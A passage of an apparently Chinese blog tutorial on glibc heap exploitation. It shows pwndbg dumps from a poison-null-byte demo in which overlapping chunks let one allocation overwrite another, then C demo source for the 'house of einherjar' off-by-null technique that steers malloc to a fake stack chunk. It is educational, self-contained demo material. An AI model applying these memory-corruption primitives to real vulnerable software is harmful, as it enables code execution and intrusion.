class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x80:</span> <span class="hljs-number">0</span>x0<br>unsortedbin<br><span class="hljs-params">all:</span> <span class="hljs-number">0</span>x603220 —▸ <span class="hljs-number">0</span>x7ffff7dd1b78 (main_arena<span class="hljs-operator">+</span><span class="hljs-number">88</span>) ◂— <span class="hljs-number">0</span>x603220 <span class="hljs-comment">/* &#x27; 2`&#x27; */</span><br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>此时我们的b1已经被放到了原本b的位置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p b1-0x10</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">15 = (uint8_t *) 0x603110 <span class="hljs-string">&quot;&quot;</span></span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p b-0x10</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">17 = (uint8_t *) 0x603110 <span class="hljs-string">&quot;&quot;</span></span><br><span class="hljs-meta prompt_">pwndbg&gt;</span><br></code></pre></td></tr></table></figure><p>然后系统又malloc了b2</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">273</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603110</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">273</span>,<br>  fd = <span class="hljs-number">0x7ffff7dd1d68</span> &lt;main_arena+<span class="hljs-number">584</span>&gt;,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x7ffff7dd1d68</span> &lt;main_arena+<span class="hljs-number">584</span>&gt;,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603220</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">145</span>,<br>  fd = <span class="hljs-number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="hljs-number">88</span>&gt;,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="hljs-number">88</span>&gt;,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x6032b0</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">97</span>,<br>  fd = <span class="hljs-number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="hljs-number">88</span>&gt;,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="hljs-number">88</span>&gt;,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603310</span> &#123;<br>  prev_size = <span class="hljs-number">96</span>,<br>  size = <span class="hljs-number">0</span>,<br>  fd = <span class="hljs-number">0x210</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x110</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p b2-0x10</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">19 = (uint8_t *) 0x603220 <span class="hljs-string">&quot;&quot;</span></span><br></code></pre></td></tr></table></figure><p>可以看到我们的b2也在原本b所在的位置上</p><p>随后我们释放b1和c,程序会直接无视b2合并b1和c,因为c的pre_size为</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">273</span>,<br>  fd = <span class="hljs-number">0</span>x0,<br>  bk = <span class="hljs-number">0</span>x0,<br>  fd_nextsize = <span class="hljs-number">0</span>x0,<br>  bk_nextsize = <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0x603110</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">801</span>,<br>  fd = <span class="hljs-number">0x6032b0</span>,<br>  bk = <span class="hljs-number">0</span>x7ffff7dd1b78 &lt;main_arena+<span class="hljs-number">88</span>&gt;,<br>  fd_nextsize = <span class="hljs-number">0</span>x0,<br>  bk_nextsize = <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0x603430</span> &#123;<br>  prev_size = <span class="hljs-number">800</span>,<br>  size = <span class="hljs-number">272</span>,<br>  fd = <span class="hljs-number">0</span>x0,<br>  bk = <span class="hljs-number">0</span>x0,<br>  fd_nextsize = <span class="hljs-number">0</span>x0,<br>  bk_nextsize = <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0x603540</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">133825</span>,<br>  fd = <span class="hljs-number">0</span>x0,<br>  bk = <span class="hljs-number">0</span>x0,<br>  fd_nextsize = <span class="hljs-number">0</span>x0,<br>  bk_nextsize = <span class="hljs-number">0</span>x0<br>&#125;<br>fastbins<br><span class="hljs-number">0</span>x20: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x30: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x40: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x50: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x60: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x70: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x80: <span class="hljs-number">0</span>x0<br>unsortedbin<br>all: <span class="hljs-number">0x603110</span> —▸ <span class="hljs-number">0x6032b0</span> —▸ <span class="hljs-number">0</span>x7ffff7dd1b78 (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x603110</span><br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x603110</span><br><span class="hljs-number">0x603110</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000321</span><br><span class="hljs-number">0x603120</span>:       <span class="hljs-number">0</span>x000000<span class="hljs-number">00006032b0</span>      <span class="hljs-number">0</span>x00007ffff7dd1b78<br><span class="hljs-number">0x603130</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603140</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603150</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br>pwndbg&gt;<br></code></pre></td></tr></table></figure><p>可以看到程序将b1和c合并了,大小为0x321,此时我们申请d,就会导致d和b2的overlapping </p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">273</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603110</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">801</span>,<br>  fd = <span class="hljs-number">0x7ffff7dd1e88</span> &lt;main_arena+<span class="hljs-number">872</span>&gt;,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x7ffff7dd1e88</span> &lt;main_arena+<span class="hljs-number">872</span>&gt;,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603430</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">800</span>,<br>  size = <span class="hljs-number">273</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603540</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">133825</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br>pwndbg&gt; p d<span class="hljs-number">-0</span>x10<br>$<span class="hljs-number">36</span> = (uint8_t *) <span class="hljs-number">0x603110</span> <span class="hljs-string">&quot;&quot;</span><br>pwndbg&gt; p <span class="hljs-keyword">b2-0x10</span><br><span class="hljs-keyword"></span>$<span class="hljs-number">37</span> = (uint8_t *) <span class="hljs-number">0x603220</span> <span class="hljs-string">&quot;\020\001&quot;</span><br></code></pre></td></tr></table></figure><p>此时b2的值为</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx b2-<span class="hljs-number">0</span>x10<br><span class="hljs-number">0x603220</span>:       <span class="hljs-number">0</span>x0000<span class="hljs-number">000000000110</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000090</span><br><span class="hljs-number">0x603230</span>:       <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span>      <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span><br><span class="hljs-number">0x603240</span>:       <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span>      <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span><br><span class="hljs-number">0x603250</span>:       <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span>      <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span><br><span class="hljs-number">0x603260</span>:       <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span>      <span class="hljs-number">0</span>x4<span class="hljs-number">242424242424242</span><br></code></pre></td></tr></table></figure><p>然后我们给d赋值,之后b2的值变成了</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx b2-<span class="hljs-number">0</span>x10<br><span class="hljs-number">0x603220</span>:       <span class="hljs-number">0</span>x44444<span class="hljs-number">44444444444</span>      <span class="hljs-number">0</span>x44444<span class="hljs-number">44444444444</span><br><span class="hljs-number">0x603230</span>:       <span class="hljs-number">0</span>x44444<span class="hljs-number">44444444444</span>      <span class="hljs-number">0</span>x44444<span class="hljs-number">44444444444</span><br><span class="hljs-number">0x603240</span>:       <span class="hljs-number">0</span>x44444<span class="hljs-number">44444444444</span>      <span class="hljs-number">0</span>x44444<span class="hljs-number">44444444444</span><br><span class="hljs-number">0x603250</span>:       <span class="hljs-number">0</span>x44444<span class="hljs-number">44444444444</span>      <span class="hljs-number">0</span>x44444<span class="hljs-number">44444444444</span><br><span class="hljs-number">0x603260</span>:       <span class="hljs-number">0</span>x44444<span class="hljs-number">44444444444</span>      <span class="hljs-number">0</span>x44444<span class="hljs-number">44444444444</span><br></code></pre></td></tr></table></figure><p>可以看到我们的b2已经被修改了</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>程序首先malloc了a(0x100),b(0x200),c(0x100),barrier(0x100)四个chunk</p><p>随后为了绕过check,程序将b+0x1f0的位置设为了0x200</p><p>紧接着程序Free掉了b并将b的size设为了0x200(原本是0x211)</p><p>随后程序malloc了b1(0x100),因为b是被Free掉的,因此b1就会被被放到b的部分,而b做了一个unlink,一分两半</p><p>随后程序又malloc了b2(0x80),b2依旧是所属b的</p><p>之后程序为了方便看效果,将b2填满了’B’</p><p>最后程序free掉了b1和c,因为c的pre_size为0x210,因此程序就会将b1和c合并,因为b2位于b1和c之间,虽然b2其实并未被free,但是我们已经可以申请到b2的内存了</p><p>此时程序malloc了d(0x300),系统就会把b1和c合并后的大chunk给用户,此时d就申请到了原本b开始到b+0x310结束的内存,将b2包了起来</p><p>构成了overlapping,此时给d赋值为”D”,可以看到b2也被覆盖成了”D” :)</p><h1 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h1><h2 id="序-1"><a href="#序-1" class="headerlink" title="序"></a>序</h2><p>这个利用技术由Hiroki Matsukuma提出,具体内容可以看<a href="https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606">链接</a></p><p>这个技术也就是利用free的后向合并把top chunk设为我们伪造的chunk地址来强制malloc分配到我们伪造的地址</p><h2 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h2><p>同样的,我这里删了一点作者的话并加了注释</p><p>作者的话:</p><p>感谢st4g3r公布这个技术</p><p>这个攻击技巧使用了off-by-one溢出漏洞，用一个 null字节来通过malloc控制指针</p><p>并且这个技术比poision null byte更强，但是也有一个附加条件就是需要泄漏堆</p><p>在ubuntu16.04 64bits上测试，可以在你有一个off-by-null漏洞时使用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-type">uint8_t</span>* a;<br>        <span class="hljs-type">uint8_t</span>* b;<br>        <span class="hljs-type">uint8_t</span>* d;<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27;\n&quot;</span>);<br>        a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x38</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;a: %p\n&quot;</span>, a);<br><br>    <span class="hljs-type">int</span> real_a_size = <span class="hljs-built_in">malloc_usable_size</span>(a);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\n&quot;</span>, real_a_size);<br><br>    <span class="hljs-comment">// create a fake chunk</span><br>    <span class="hljs-comment">//我们可以在任意一个我们想要的地方来创建一个fake chunk,本例中我们将在栈上创建这个fake chunk</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nWe create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stack\n&quot;</span>);<br>    <span class="hljs-comment">//当然，你可以在heap或者bss段任一个你知道地址的地方创建fake chunk</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;</span>);<br>    <span class="hljs-comment">//我们将我们的fwd和bck指针指向fake_chunk来pass unlink的checks</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);<br>    <span class="hljs-comment">//尽管有的时候我们可以在这儿使用unsafe unlink技术</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;</span>);<br><br>    <span class="hljs-type">size_t</span> fake_chunk[<span class="hljs-number">6</span>];<br><br>    fake_chunk[<span class="hljs-number">0</span>] = <span class="hljs-number">0x100</span>; <span class="hljs-comment">// prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span><br>    fake_chunk[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span>; <span class="hljs-comment">// size of the chunk just needs to be small enough to stay in the small bin</span><br>    fake_chunk[<span class="hljs-number">2</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// fwd</span><br>    fake_chunk[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// bck</span><br>    fake_chunk[<span class="hljs-number">4</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//fwd_nextsize</span><br>    fake_chunk[<span class="hljs-number">5</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//bck_nextsize</span><br><br><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, fake_chunk);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;prev_size (not used): %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;size: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;fwd: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;bck: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">3</span>]);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;fwd_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">4</span>]);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;bck_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="hljs-number">5</span>]);<br><br><br>    <br>        <span class="hljs-comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span><br><span class="hljs-comment">         * a value of 0x00. The least significant byte of this will be 0x00, because the size of</span><br><span class="hljs-comment">         * the chunk includes the amount requested plus some amount required for the metadata. */</span><br>        b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br>    <span class="hljs-type">int</span> real_b_size = <span class="hljs-built_in">malloc_usable_size</span>(b);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nWe allocate 0xf8 bytes for &#x27;b&#x27;.\n&quot;</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br><br>        <span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br>    <span class="hljs-comment">//这个技术通过覆盖chunk的size以及pre_inuse位来工作</span><br>    <span class="hljs-comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span><br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);<br>        a[real_a_size] = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br>    <span class="hljs-comment">//如果b的size是0x100的倍数，那么就很简单了，连size都不用改，直接修改他的pre_inuse位就好啦</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This is easiest if b.size is a multiple of 0x100 so you &quot;</span><br>           <span class="hljs-string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);<br>    <span class="hljs-comment">//如果已经被修改了，我们将在b内需要一个fake chunk，它将尝试合并下一个块</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;If it had been modified, we would need a fake chunk inside &quot;</span><br>           <span class="hljs-string">&quot;b where it will try to consolidate the next chunk\n&quot;</span>);<br><br>    <span class="hljs-comment">// Write a fake prev_size to the end of a</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot;</span><br>           <span class="hljs-string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>));<br>    <span class="hljs-type">size_t</span> fake_size = (<span class="hljs-type">size_t</span>)((b-<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>) - (<span class="hljs-type">uint8_t</span>*)fake_chunk);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b-<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>, fake_chunk, fake_size);<br>    *(<span class="hljs-type">size_t</span>*)&amp;a[real_a_size-<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>)] = fake_size;<br><br>    <span class="hljs-comment">//修改fake chunk的size去反应b的新的prev_size</span><br>    <span class="hljs-comment">//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\n&quot;</span>);<br>    fake_chunk[<span class="hljs-number">1</span>] = fake_size;<br><br>    <span class="hljs-comment">//free b，之后他就会和我们的fake chunk合并了</span><br>    <span class="hljs-comment">// free b and it will consolidate with our fake chunk</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not 